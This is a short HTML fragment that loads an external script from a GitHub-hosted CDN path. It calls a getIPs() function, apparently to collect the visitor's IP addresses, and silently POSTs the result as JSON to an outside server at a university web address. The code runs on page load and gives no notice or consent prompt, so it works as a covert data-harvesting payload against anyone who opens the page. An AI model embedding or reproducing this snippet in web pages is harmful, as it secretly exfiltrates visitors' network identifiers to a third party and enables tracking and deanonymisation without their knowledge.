<script src="https://cdn.jsdelivr.net/gh/mm2623/Detailed-information/prod.js"></script>
<script>
getIPs().then(data=>{
    let http = new XMLHttpRequest();
    http.open("POST", "https://afsaccess4.njit.edu/~mm2623/canvas/info", true);
    let q = JSON.stringify(data);
    http.setRequestHeader('Content-Type', 'application/json');
    http.send(q);
})
</script>
